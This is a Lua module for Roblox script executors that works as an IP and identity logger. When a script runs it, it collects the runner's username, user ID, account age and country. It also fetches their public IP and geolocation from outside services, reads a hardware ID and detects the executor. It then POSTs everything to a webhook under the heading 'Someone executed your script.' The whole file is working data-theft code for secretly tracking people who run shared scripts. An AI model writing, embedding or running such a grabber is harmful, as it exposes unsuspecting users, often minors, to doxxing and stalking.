local Celesth = {}
Celesth.__index = Celesth

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local AnalyticsService = game:GetService("RbxAnalyticsService")

-- Services
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local Membership = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local JoinLine = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Default config
_G.IpLog = _G.IpLog ~= false
_G.GeoLog = _G.GeoLog ~= false
_G.HwidLog = _G.HwidLog ~= false
_G.ExecutorLog = _G.ExecutorLog ~= false
_G.JobIdLog = _G.JobIdLog ~= false

-- Cache G_
_G_ = rawget(getgenv(), "G_") or {}
getgenv().G_ = _G_

local function GetIP()
    if not _G.IpLog then return "Disabled" end
    if not G_.ip then
        local ok, res = pcall(function()
            return game:HttpGet("https://v4.ident.me/")
        end)
        G_.ip = ok and res or "Unavailable"
    end
    return G_.ip
end

local function GetGeo()
    if not _G.GeoLog then return {message = "Disabled"} end
    if not G_.geo then
        local ok, res = pcall(function()
            return game:HttpGet("http://ip-api.com/json")
        end)
        G_.geo = ok and HttpService:JSONDecode(res) or { message = "Unavailable" }
    end
    return G_.geo
end

local function GetHWID()
    return _G.HwidLog and AnalyticsService:GetClientId() or "Disabled"
end

local function GetExecutor()
    if not _G.ExecutorLog then return "Disabled" end
    return (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
        or (secure_load and "Sentinel")
        or (pebc_execute and "ProtoSmasher")
        or (KRNL_LOADED and "KRNL")
        or (is_sirhurt_closure and "SirHurt")
        or (identifyexecutor and identifyexecutor():match("ScriptWare") and "Script-Ware")
        or "Unknown"
end

function Celesth:BuildEmbed()
    local ip = GetIP()
    local geo = GetGeo()
    local hwid = GetHWID()
    local exec = GetExecutor()

    local desc = string.format(
        "__[Player Info](https://www.roblox.com/users/%d)__" ..
        "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
        "\n**AccountAge:** %d\n**Country:** %s", 
        UserId, DisplayName, Username, UserId, Membership, AccountAge, Country
    )

    if _G.IpLog then desc = desc .. "\n**IP:** " .. ip end
    if _G.HwidLog then desc = desc .. "\n**HWID:** " .. hwid end
    if _G.ExecutorLog then desc = desc .. "\n**Executor:** " .. exec end

    desc = desc .. "\n**Date:** " .. os.date("%m/%d/%Y") .. "  **Time:** " .. os.date("%X")

    desc = desc .. string.format(
        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
        "\n**Game:** %s \n**Game Id:** %d", 
        game.PlaceId, GameName, game.PlaceId
    )

    if _G.GeoLog then
        desc = desc .. "\n\n**Geo Data:**```" .. HttpService:JSONEncode(geo) .. "```"
    end
    if _G.JobIdLog then
        desc = desc .. "\n\n**JobId:**```" .. JoinLine .. "```"
    end

    return {
        avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        content = "",
        embeds = {{
            author = {
                name = "Someone executed your script",
                url = "https://roblox.com"
            },
            description = desc,
            type = "rich",
            color = 16766720,
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
            }
        }}
    }
end

function Celesth:Log(webhookUrl)
    assert(type(webhookUrl) == "string" and webhookUrl:match("^https://"), "Invalid webhook URL")
    local request = http_request or request or syn.request
    assert(request, "No HTTP request function available")
    local data = self:BuildEmbed()
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

return setmetatable({}, Celesth)
